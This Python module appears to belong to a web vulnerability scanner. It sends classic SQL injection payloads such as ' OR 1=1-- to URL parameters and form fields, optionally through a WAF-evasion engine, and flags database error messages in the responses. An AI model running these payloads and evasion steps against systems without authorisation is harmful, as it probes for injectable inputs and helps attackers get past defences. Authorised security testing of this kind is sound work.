import requests
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.smart_fuzzer import SmartFuzzer

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query() [",
    "sqlite3.operationalerror"
]

PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1"
]

def run_sqli_scan(target_url, endpoints, forms, waf_engine=None):
    print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Running SQL Injection Scan (WAF Evasion Enabled)...")
    results = []

    # 1. Scan query parameters in endpoints
    for url in endpoints:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            continue
            
        for param_name in params:
            for payload in PAYLOADS:
                if waf_engine:
                    payload = waf_engine.evade(payload)
                    
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=new_query))
                
                try:
                    if waf_engine:
                        r = waf_engine.request('GET', test_url, timeout=5)
                    else:
                        r = requests.get(test_url, timeout=5)
                        
                    content = r.text.lower()
                    
                    for error in SQL_ERRORS:
                        if error in content:
                            res = f"Possible SQLi (Error-based) on {test_url} [Param: {param_name}]"
                            print(f"  [{Fore.RED}!{Style.RESET_ALL}] {res}")
                            results.append({"type": "sqli", "desc": res, "severity": "Critical"})
                            break # Found one, skip other errors for this payload
                except requests.RequestException:
                    continue

    # 2. Scan forms
    for form in forms:
        action = form["action"]
        method = form["method"]
        
        for payload in PAYLOADS:
            if waf_engine:
                payload = waf_engine.evade(payload)
                
            data = {}
            for input_field in form["inputs"]:
                data[input_field["name"]] = payload
                
            try:
                if method == 'post':
                    if waf_engine:
                        r = waf_engine.request('POST', action, data=data, timeout=5)
                    else:
                        r = requests.post(action, data=data, timeout=5)
                else:
                    if waf_engine:
                        r = waf_engine.request('GET', action, params=data, timeout=5)
                    else:
                        r = requests.get(action, params=data, timeout=5)
                    
                content = r.text.lower()
                for error in SQL_ERRORS:
                    if error in content:
                        res = f"Possible SQLi (Error-based) in form {action} via {method.upper()}"
                        print(f"  [{Fore.RED}!{Style.RESET_ALL}] {res}")
                        results.append({"type": "sqli", "desc": res, "severity": "Critical"})
                        break
            except requests.RequestException:
                continue

    return results